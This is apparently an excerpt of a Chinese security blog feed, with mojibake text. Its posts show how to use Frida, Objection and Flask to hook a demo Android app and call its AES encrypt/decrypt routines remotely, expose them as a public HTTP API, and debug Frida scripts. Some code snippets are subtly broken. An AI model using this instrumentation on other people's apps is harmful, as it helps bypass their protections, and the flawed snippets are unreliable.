function_">get_data</span>()</span><br><span class="line">    json_data = json.<span class="title function_">loads</span>(data.<span class="title function_">decode</span>(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.<span class="title function_">get</span>(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    res = script.<span class="property">exports</span>.<span class="title function_">invoke2</span>(postdata)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>()</span><br></pre></td></tr></table></figure><p>ç«¯å£usbè¿æ¥ï¼Œä¸»æœºè¿æ¥adb, .&#x2F;fs128arm64 -l 0.0.0.0:8888 å¯åŠ¨frida server</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231037083.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231037864.png" alt="img"> </p><h1 id="è„±ç¦»APK"><a href="#è„±ç¦»APK" class="headerlink" title="è„±ç¦»APK"></a>è„±ç¦»APK</h1><p>å‰æï¼šå‡½æ•°çš„æ•´ä¸ªå®ç°é€»è¾‘éƒ½æ˜¯åœ¨Nativeå±‚ä¸­çš„ï¼Œä¸æ¶‰åŠåˆ°Javaå±‚çš„å›è°ƒã€‚</p><p>1ã€é¦–å…ˆï¼Œè§£å‹APKï¼Œæ‰¾åˆ°å¯¹åº”soæ–‡ä»¶ï¼Œå°†å…¶ä¼ åˆ°æŒ‡å®šç›®å½•ä¸‹ï¼Œè¿™å—ä»¥&#x2F;data&#x2F;local&#x2F;tmpä¸ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">adb push libnative-lib.<span class="property">so</span> /data/local/tmp</span><br><span class="line"></span><br><span class="line">chmod <span class="number">777</span> libnative-lib.<span class="property">so</span>  <span class="comment">//èµ‹äºˆæ‰§è¡Œæƒé™</span></span><br></pre></td></tr></table></figure><p>2ã€ä¿®æ”¹ä¸Šé¢çš„hookè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> modulelibnative =  <span class="title class_">Module</span>.<span class="title function_">load</span>(<span class="string">&quot;/data/app/libnative-lib.so&quot;</span>)  <span class="comment">// åŠ è½½so</span></span><br></pre></td></tr></table></figure><p>3ã€FridaåŠ è½½ï¼Œå°†soæ–‡ä»¶å¼•ç”¨åˆ°è®¾ç½®ä¸­</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">frida -U -f com.<span class="property">android</span>.<span class="property">settings</span> -l hook_RegisterNatives.<span class="property">js</span> --no-pause</span><br></pre></td></tr></table></figure><p>4ã€ObjectionæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°libnative-lib.soå·²ç»è¢«åŠ è½½</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">objection -g com.<span class="property">android</span>.<span class="property">settings</span> explore </span><br><span class="line">memory list modules   å¯ä»¥çœ‹åˆ°libnative-lib.<span class="property">so</span>å·²ç»è¢«åŠ è½½</span><br><span class="line">memory list <span class="built_in">exports</span> libnative-lib.<span class="property">so</span> æ‰¾åˆ°ä¸¤ä¸ªå‡½æ•°å_Z8method01P7_JNIEnvP7_jclassP8_jstringï¼Œ_Z8method02P7_JNIEnvP8_jobjectP8_jstring</span><br></pre></td></tr></table></figure><p>5ã€ä¸»åŠ¨è°ƒç”¨</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">method01addr = modulelibnative.<span class="title function_">findExportByName</span>(<span class="string">&quot;_Z8method01P7_JNIEnvP7_jclassP8_jstring&quot;</span>)</span><br><span class="line">method02addr = modulelibnative.<span class="title function_">findExportByName</span>(<span class="string">&quot;_Z8method02P7_JNIEnvP8_jobjectP8_jstring&quot;</span>)</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹init.<span class="property">py</span>ä¸­pid = device.<span class="title function_">spawn</span>([<span class="string">&quot;com.android.settings&quot;</span>])</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231037220.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸»åŠ¨è°ƒç”¨ </tag>
            
            <tag> RPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸»åŠ¨è°ƒç”¨-Javaå±‚ä¸»åŠ¨è°ƒç”¨å¹¶æš´æ¼è‡³å…¬ç½‘</title>
      <link href="/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Java%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/"/>
      <url>/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Java%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-pyenvæ›´æ–°"><a href="#0x00-pyenvæ›´æ–°" class="headerlink" title="0x00 pyenvæ›´æ–°"></a>0x00 pyenvæ›´æ–°</h1><p>å½“æœ‰Pythonæ–°ç‰ˆæœ¬æ›´æ–°åï¼Œå¦‚æœæ—§ç‰ˆæœ¬pyenvæ²¡æœ‰é›†æˆè¿›å»çš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨æ›´æ–°ä¸€ä¸‹pyenvç‰ˆæœ¬ï¼Œæ–¹ä¾¿å®‰è£…ã€‚</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>winæ¯”è¾ƒç®€å•ï¼Œç›´æ¥ <code>pyenv update</code> å°±è¡Œ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091556011.png" alt="image.png"> </p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>å‚è€ƒï¼š<a href="https://github.com/pyenv/pyenv-update">GitHub - pyenv&#x2F;pyenv-update: update pyenv and plugins</a></p><p>1ã€å®‰è£…pyenvçš„æ›´æ–°æ‰©å±•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv-update.git $(pyenv root)/plugins/pyenv-update</span><br></pre></td></tr></table></figure><p>2ã€æ›´æ–°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv update</span><br></pre></td></tr></table></figure><h1 id="0x01-Demoä»‹ç»"><a href="#0x01-Demoä»‹ç»" class="headerlink" title="0x01 Demoä»‹ç»"></a>0x01 Demoä»‹ç»</h1><h2 id="ä»£ç ä»‹ç»"><a href="#ä»£ç ä»‹ç»" class="headerlink" title="ä»£ç ä»‹ç»"></a>ä»£ç ä»‹ç»</h2><p>1ã€å®šä¹‰ä¸¤ä¸ªæ–¹æ³• method01å’Œmethod02ï¼Œåˆ†åˆ«ç”¨æ¥è¿›è¡ŒAESåŠ å¯†å’Œè§£å¯†ã€‚</p><p>å…¶ä¸­method01ä¸ºé™æ€æ–¹æ³•ï¼›method02ä¸ºå®ä¾‹æ–¹æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558967.png" alt="image.png"> </p><p>2ã€è¿›åˆ°soå±‚ä¸­æŸ¥çœ‹å…·ä½“å‡½æ•°å®ç°ï¼Œä¼šå‘ç°è¿™ä¸¤ä¸ªå‡½æ•°æ˜¯åšäº†åŠ¨æ€ç»‘å®šçš„ï¼ˆjavaå±‚å’Œsoå±‚çš„å‡½æ•°åä¸è¦æ±‚ä¸€æ ·ï¼Œä¼šåœ¨ä»£ç ä¸­è¿›è¡ŒåŠ¨æ€ç»‘å®šçš„ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558375.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558435.png" alt="image.png"> </p><p>3ã€åœ¨javaä»£ç ä¸­ï¼Œä¼šè°ƒç”¨method01å’Œmethod02å¯¹StringFromJNI2è¿”å›çš„å†…å®¹è¿›è¡ŒåŠ å¯†å’Œè§£å¯†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558685.png" alt="image.png"> </p><p>StringFromJNI2å‡½æ•°è¿”å›çš„å†…å®¹ä¸ºâ€œHello from c++ StringFromJNI2â€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091559233.png" alt="image.png"> </p><p>åˆ°è¿™ï¼Œæ•´ä¸ªdemoçš„é€»è¾‘å°±æ¸…æ¥šäº†~~~</p><h2 id="å‚æ•°æ„é€ å’Œä¸»åŠ¨è°ƒç”¨æ ¸å¿ƒåŸåˆ™"><a href="#å‚æ•°æ„é€ å’Œä¸»åŠ¨è°ƒç”¨æ ¸å¿ƒåŸåˆ™" class="headerlink" title="å‚æ•°æ„é€ å’Œä¸»åŠ¨è°ƒç”¨æ ¸å¿ƒåŸåˆ™"></a>å‚æ•°æ„é€ å’Œä¸»åŠ¨è°ƒç”¨æ ¸å¿ƒåŸåˆ™</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šHook"><a href="#ç¬¬ä¸€æ­¥ï¼šHook" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šHook"></a>ç¬¬ä¸€æ­¥ï¼šHook</h3><p>ä¸»åŠ¨è°ƒç”¨ä¹‹å‰å…ˆhookï¼Œhookæœ¬èº«å°±æ˜¯ä¸€ä¸ªä¸»åŠ¨è°ƒç”¨çš„è¿‡ç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br><span class="line">android  hooking list class_methods com.example.demoso1.MainActivity</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091606570.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hookç±»ä¸­æ‰€æœ‰æ–¹æ³•</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity</span><br><span class="line"></span><br><span class="line"># hookå…³é”®å‡½æ•°method01å’Œmethod02</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity.method01 --dump-args --dump-backtrace  --dump=return</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity.method02 --dump-args --dump-backtrace  --dump=return</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607018.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607546.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607535.png" alt="image.png"> </p><h3 id="ç¬¬äºŒæ­¥ï¼Œä¸»åŠ¨è°ƒç”¨"><a href="#ç¬¬äºŒæ­¥ï¼Œä¸»åŠ¨è°ƒç”¨" class="headerlink" title="ç¬¬äºŒæ­¥ï¼Œä¸»åŠ¨è°ƒç”¨"></a>ç¬¬äºŒæ­¥ï¼Œä¸»åŠ¨è°ƒç”¨</h3><p>1ã€é¦–å…ˆï¼Œmethod01æ˜¯é™æ€æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609000.png" alt="image.png"> </p><p>è¿è¡Œä¹‹åå‘ç°ï¼Œæ‰“å°å‡ºæ¥çš„result ä¸º undefinedï¼Ÿï¼Ÿï¼Ÿï¼Ÿè¿™æ˜¯å•¥åŸå› </p><p>è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å°† var result å®šä¹‰åˆ°äº†Java.preformçš„è™šæ‹Ÿæœºä¸­äº†ï¼Œè¿™æ ·åœ¨ä¸»åŠ¨è°ƒç”¨çš„æ—¶å€™ï¼Œæ˜¯ä¼ ä¸åˆ°å¤–é¢æ¥çš„ã€‚</p><p>æ‰€ä»¥ï¼Œä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609149.png" alt="img"> </p><p>æˆåŠŸæ‰“å°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609214.png" alt="img"> </p><p>2ã€method02æ˜¯éé™æ€æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œéœ€è¦å…ˆæ‰¾åˆ°å®ƒçš„å®ä¾‹å¯¹è±¡ï¼Œå†è°ƒç”¨method02æ–¹æ³•</p><p>ä½¿ç”¨Java.chooseè¿›è¡ŒæŸ¥æ‰¾ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610377.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610977.png" alt="image.png"> </p><p>è¿™å—å°±å¯ä»¥ä¿è¯åœ¨JSä»£ç ä¸­ä¸»åŠ¨è°ƒç”¨æ­£å¸¸è¿è¡Œäº†</p><h3 id="ç¬¬ä¸‰æ­¥ï¼šrpc"><a href="#ç¬¬ä¸‰æ­¥ï¼šrpc" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šrpc"></a>ç¬¬ä¸‰æ­¥ï¼šrpc</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rpc.<span class="property">exports</span>=&#123;</span><br><span class="line">    <span class="attr">fridamethod01</span>:fridamethod01,</span><br><span class="line">    <span class="attr">fridamethod02</span>:fridamethod02</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610058.png" alt="img"> </p><h2 id="åŸºäºIPæ„å»ºFrida-serveré›†ç¾¤"><a href="#åŸºäºIPæ„å»ºFrida-serveré›†ç¾¤" class="headerlink" title="åŸºäºIPæ„å»ºFrida-serveré›†ç¾¤"></a>åŸºäºIPæ„å»ºFrida-serveré›†ç¾¤</h2><p>ä½¿ç”¨Pythonæ¥è°ƒç”¨ä¸Šé¢çš„Fridaè„šæœ¬</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰é”™è¯¯å¤„ç†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    // message å‚æ•°åŒ…å«æ¶ˆæ¯çš„ç±»å‹å’Œå†…å®¹</span><br><span class="line">    // data </span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨ç›®æ ‡åº”ç”¨å¹¶é™„åŠ åˆ° Frida</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.1:8888&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.example.demoso1&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½JSè„šæœ¬</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;my_script.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½è„šæœ¬å¹¶å®šä¹‰æ¶ˆæ¯å¤„ç†å‡½æ•°</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨å¯ä»¥é€šè¿‡ RPC è°ƒç”¨å®šä¹‰çš„å‡½æ•°</span></span><br><span class="line">result = script.exports.myFunction(arg1, arg2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è„šæœ¬ä¼šæŒç»­è¿è¡Œç­‰å¾…è¾“å…¥</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><h1 id="0x02-é…ç½®flaskå®ç°Httpæ¥å£è°ƒç”¨"><a href="#0x02-é…ç½®flaskå®ç°Httpæ¥å£è°ƒç”¨" class="headerlink" title="0x02 é…ç½®flaskå®ç°Httpæ¥å£è°ƒç”¨"></a>0x02 é…ç½®flaskå®ç°Httpæ¥å£è°ƒç”¨</h1><p>[<a href="https://bbs.kanxue.com/thread-262562.htm">åŸåˆ›]frida-rpc è¿œç¨‹è°ƒç”¨SOé‡Œé¢çš„åŠ è§£å¯†ç®—æ³•-Androidå®‰å…¨-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>apkæ‹–åˆ°jadxé‡Œé¢ï¼Œæ‰¾åˆ°æˆ‘ä»¬éœ€è¦è°ƒç”¨çš„æ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091709533.png" alt="img"> </p><p>æˆ‘ä»¬å°±ä¸å»åˆ†æä»–çš„soäº†  æˆ‘ä»¬è¦ä½¿ç”¨çš„æ˜¯frida-rpcè¿œç¨‹è°ƒç”¨æ¥å£ã€‚ã€‚ã€‚ </p><p>çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•çš„å…·ä½“ä»£ç ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091714655.png" alt="image.png"> </p><p>ä¼ stringå‚æ•°  è¿”å›byte[]</p><p>ç›´æ¥è°ƒç”¨encryptSrc ä¼ stringè¿”å›stringï¼ŒdecryptSrc åŒç†</p><p>ä¸Šfrida rpcä»£ç </p><p><strong>test.js</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724895963320-749ef596-d178-46c5-9fbb-b267a689e03d.png" alt="img"> </p><p>python ä»£ç   æˆ‘ä»¬è¦è¿œç¨‹è°ƒç”¨APIæ¥å£ï¼Œ<br>ç›´æ¥åœ¨GitHubä¸‹è½½çš„ åˆ«äººä»£ç æ”¹äº†ä¸€ä¸‹ï¼Œå…¨POSTæ¥å£æ–¹æ³•ä¼ å‚æ•°</p><p><strong>flaskæ¡†æ¶</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724896159461-26691085-39b1-49c4-932b-b7d15883059b.png" alt="img"> </p><p>å¯åŠ¨æˆ‘ä»¬æ‰‹æœºé‡Œé¢çš„frida-server æœåŠ¡ï¼Œæˆ‘æ”¹åä¸ºfs  ç”¨åå°å¯åŠ¨</p><p>çœ‹å›¾</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716909.png" alt="img"> </p><p>è¿è¡Œæˆ‘ä»¬çš„flaskæ¡†æ¶</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716891.png" alt="img"> </p><p>è°ƒç”¨ä¸€ä¸‹åŠ è§£å¯†ï¼Œæ¥è¿·çš„APIæ¥å£çœ‹çœ‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716925.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724896230009-b57ff62f-f5b6-448b-83b1-3bbdcef20ae2.png" alt="img"> </p><h1 id="0x03-é…ç½®NPSå®ä¹ å¤–ç½‘è°ƒç”¨fsæˆ–httpæ¥å£"><a href="#0x03-é…ç½®NPSå®ä¹ å¤–ç½‘è°ƒç”¨fsæˆ–httpæ¥å£" class="headerlink" title="0x03 é…ç½®NPSå®ä¹ å¤–ç½‘è°ƒç”¨fsæˆ–httpæ¥å£"></a>0x03 é…ç½®NPSå®ä¹ å¤–ç½‘è°ƒç”¨fsæˆ–httpæ¥å£</h1><p><a href="https://blog.csdn.net/qq_41813208/article/details/113760249">https://blog.csdn.net/qq_41813208/article/details/113760249</a></p><h1 id="0x04-å‹åŠ›æµ‹è¯•Httpæ¥å£å¹¶å‘æ€§èƒ½"><a href="#0x04-å‹åŠ›æµ‹è¯•Httpæ¥å£å¹¶å‘æ€§èƒ½" class="headerlink" title="0x04 å‹åŠ›æµ‹è¯•Httpæ¥å£å¹¶å‘æ€§èƒ½"></a>0x04 å‹åŠ›æµ‹è¯•Httpæ¥å£å¹¶å‘æ€§èƒ½</h1><p>siegeå‹åŠ›æµ‹è¯•å·¥å…·ï¼Œå¯å‚è€ƒå¦‚ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/chenxiaomeng/p/13130526.html">ã€å‹æµ‹ã€‘å‹åŠ›æµ‹è¯•å·¥å…·siegeçš„ç”¨æ³• - é™ˆæ™“çŒ› - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1921001">webç½‘ç«™å‹æµ‹å·¥å…·Siegeä»‹ç»-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> rpc </tag>
            
            <tag> flask </tag>
            
            <tag> NPS </tag>
            
            <tag> Siegeå‹æµ‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é…ç½®RPCå’Œå¼€å‘å§¿åŠ¿</title>
      <link href="/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-%E9%85%8D%E7%BD%AERPC%E5%92%8C%E5%BC%80%E5%8F%91%E5%A7%BF%E5%8A%BF/"/>
      <url>/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-%E9%85%8D%E7%BD%AERPC%E5%92%8C%E5%BC%80%E5%8F%91%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>Fridaæ˜¯ä¸€æ¬¾åŸºäºPythonå’ŒJavaScriptçš„è¿›ç¨‹çº§Hookæ¡†æ¶ï¼Œå…¶ä¸­JavaScriptè¯­è¨€æ‰¿æ‹…äº†Hookçš„ä¸»è¦å·¥ä½œï¼Œè€ŒPythonè¯­è¨€åˆ™ç›¸å½“äºæä¾›ç»™å¤–ç•Œçš„ç»‘å®šæ¥å£ï¼Œä½¿ç”¨è€…å¯ä»¥é€šè¿‡Pythonè¯­è¨€å°†JavaScriptè„šæœ¬æ³¨å…¥è¿›ç¨‹ä¸­ï¼Œå®˜æ–¹ä¹Ÿåœ¨ä¸‹æ–¹ä»“åº“ä¸­æä¾›äº†Pythonè¿œç¨‹è°ƒç”¨JavaScriptä¸­å‡½æ•°çš„æ–¹å¼ï¼š</p><p><a href="https://github.com/frida/frida-python"><strong>https://github.com/frida/frida-python</strong></a></p><p>ä¸‹é¢ç®€å•ä»‹ç»ä¸‹é€šè¿‡Pythonå®ç°Fridaæ³¨å…¥çš„åŸºæœ¬æ–¹å¼ã€‚</p><h1 id="0x00-å¼€å‘ç¯å¢ƒå‡†å¤‡"><a href="#0x00-å¼€å‘ç¯å¢ƒå‡†å¤‡" class="headerlink" title="0x00 å¼€å‘ç¯å¢ƒå‡†å¤‡"></a>0x00 å¼€å‘ç¯å¢ƒå‡†å¤‡</h1><p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚ç¼–å†™ frida js æ—¶è®© IDE æ™ºèƒ½æç¤ºã€ä½¿ç”¨ IDE ç¼–å†™ frida js æ—¶æ™ºèƒ½æç¤ºã€‘</p><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><ul><li><strong>git clone <a href="https://github.com/oleavr/frida-agent-example.git">https://github.com/oleavr/frida-agent-example.git</a></strong></li><li>**cd frida-agent-example&#x2F;**ï¼Œæ‰§è¡Œå‘½ä»¤ <strong>npm install</strong></li><li>ç„¶åä½¿ç”¨ VSCodeã€pycharmã€idea ç­‰ IDE æ‰“å¼€æ­¤å·¥ç¨‹ï¼Œåœ¨ agent ç›®å½•ä¸‹ç¼–å†™ JavaScript ä»£ç æ—¶å°±ä¼šæœ‰æ™ºèƒ½æç¤ºã€‚</li></ul><h3 id="JSå•æ­¥è°ƒè¯•"><a href="#JSå•æ­¥è°ƒè¯•" class="headerlink" title="JSå•æ­¥è°ƒè¯•"></a>JSå•æ­¥è°ƒè¯•</h3><p><a href="https://bbs.pediy.com/thread-265160.htm">https://bbs.pediy.com/thread-265160.htm</a></p><p>èƒ½æ„‰å¿«çš„å•æ­¥è°ƒè¯• frida çš„ js è„šæœ¬ï¼Œå¯ä»¥æ–¹ä¾¿ä¸å°‘ã€‚é¦–å…ˆè¿è¡Œ frida è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frida -l &lt;/Users/name/path/test.js&gt; --debug --runtime=v8 &lt;port/name&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session = dev.attach(app.pid)</span><br><span class="line">script = session.create_script(jscode, runtime=<span class="string">&quot;v8&quot;</span>)</span><br><span class="line">session.enable_debugger()</span><br></pre></td></tr></table></figure><p>å¯åŠ¨åä¼šå›æ˜¾ Inspector æ­£åœ¨ç›‘å¬ 9229 é»˜è®¤ç«¯å£</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Chrome Inspector server listening on port <span class="number">9229</span></span><br></pre></td></tr></table></figure><h4 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h4><p>æ‰“å¼€ chrome:&#x2F;&#x2F;inspect, ç‚¹å‡» <code>Open dedicated DevTools for Nodeã€‚</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081422305.png" alt="image.png"> </p><p>æ­¤æ—¶ debug å·²ç»è¿æ¥ï¼Œåˆ‡æ¢è‡³ <code>Sources</code>ï¼ŒæŒ‰ <code>Command + P</code> åŠ è½½è¦è°ƒè¯•çš„è„šæœ¬ï¼Œå³å¯ä¸‹æ–­è°ƒè¯•äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081422998.png" alt="image.png"> </p><h4 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h4><p>é¦–å…ˆå®‰è£… Node.js æ’ä»¶ï¼Œé‡å¯ã€‚æ·»åŠ è°ƒè¯•å™¨ <code>Attaching to Node.js/Chrome</code>ï¼Œç«¯å£é»˜è®¤å³å¯ã€‚<code>Attach to</code> åº”é€‰æ‹© <code>Node.js &lt; 8 started with --debug</code>ï¼Œ ä¸‹é¢çš„è‡ªåŠ¨é‡è¿é€‰é¡¹å¯é€‰å¯ä¸é€‰ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424191.png" alt="image.png"> </p><p>è§¦å‘æ–­ç‚¹éœ€è¦åœ¨ debug çª—å£åˆ‡æ¢åˆ° script é€‰é¡¹å¡ï¼Œå³é”®è¦è°ƒè¯•çš„è„šæœ¬ï¼Œé€‰æ‹© Open Actual Sourceï¼Œåœ¨æ–°æ‰“å¼€çš„ Actual Source çª—å£è®¾ç½®å¥½æ–­ç‚¹åï¼Œéœ€è¦å†å–æ¶ˆ&#x2F;å¯ç”¨ä¸€æ¬¡æ‰€æœ‰æ–­ç‚¹ä½œä¸ºæ¿€æ´»ï¼Œå‘ç°æ–­ç‚¹ä¸Šæ‰“ä¸Šå¯¹å‹¾æ‰çœŸæ­£å¯ç”¨äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424695.png" alt="image.png"> </p><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ­£å¸¸è°ƒè¯•äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424106.png" alt="image.png"> </p><h4 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h4><ol><li>ç”¨ Chrome è°ƒè¯•æ”¯æŒçš„æ›´ä¸ºé¡ºæ»‘ï¼Œè°ƒè¯•è„šæœ¬è‡ªåŠ¨é‡åŠ è½½ï¼Œæ–­ç‚¹ä¹Ÿèƒ½æ­£ç¡®å“åº”ã€‚</li><li>ç”¨ PyCharm è°ƒè¯•æ–­ç‚¹æœ‰æ—¶éœ€è¦æ‰‹åŠ¨æ¿€æ´»æœ‰ç‚¹éº»çƒ¦ï¼Œä½†å¯ä»¥ä½¿ç”¨PyCharm çš„Debug çª—å£å’Œå¿«æ·é”®ã€‚</li><li>PyCharm ä½¿ç”¨ ts ç¯å¢ƒè°ƒè¯•æ—¶ï¼Œå¯ä»¥ç›´æ¥åœ¨tsæ–‡ä»¶ä¸Šä¸‹æ–­ï¼Œä¹Ÿä¸éœ€è¦æ‰‹åŠ¨æ¿€æ´»æ–­ç‚¹ã€‚</li></ol><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p><a 